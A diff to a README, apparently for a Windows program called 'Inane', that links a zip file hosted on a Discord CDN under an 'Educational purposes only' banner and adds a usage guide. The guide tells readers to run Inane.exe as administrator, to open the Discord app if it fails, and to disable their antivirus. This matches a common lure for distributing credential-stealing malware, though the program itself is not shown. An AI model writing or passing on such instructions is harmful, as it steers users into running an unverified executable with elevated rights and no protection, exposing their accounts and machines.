@@ -7,3 +7,15 @@
 <h6 align="center">Educational purposes only<br><br><br>
 <a href="https://cdn.discordapp.com/attachments/1105821412612112506/1106555959364562944/Inane-main.zip">
 <img src="https://i.imgur.com/LmuHhjx.png" alt="App Download" width="200" height"auto"></a><br><br>
+
+  
+  ## 🎆 Screenshots
+  
+  
+  
+  
+  
+  ## 🛠️ Usage Guide
+Download the zip file and extract it, run Inane.exe **as admnistrator**.
+If it doesnt work try opening the discord app and re running.
+⚠️ You may have to disable your antivirus.
